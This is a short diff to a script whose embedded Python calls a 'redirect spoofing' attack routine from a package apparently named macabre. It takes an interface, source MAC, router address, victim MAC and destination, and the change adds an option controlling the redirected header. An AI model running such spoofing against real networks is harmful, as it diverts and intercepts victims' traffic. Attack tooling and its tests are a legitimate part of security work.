@@ -105,7 +105,7 @@ REDIRECT_CODE='
 import sys, threading
 from macabre.attacks.redirect_spoofing import RedirectSpoofingConfig, run_redirect_spoofing
 stats = run_redirect_spoofing(
-    RedirectSpoofingConfig(iface=sys.argv[1], source_mac=sys.argv[2], router_address=sys.argv[3], victim_mac=sys.argv[4], destination=sys.argv[5], frames=3),
+    RedirectSpoofingConfig(iface=sys.argv[1], source_mac=sys.argv[2], router_address=sys.argv[3], victim_mac=sys.argv[4], destination=sys.argv[5], frames=3, include_redirected_header=False),
     threading.Event(), lambda _s: None,
 )
 print(stats.frames)
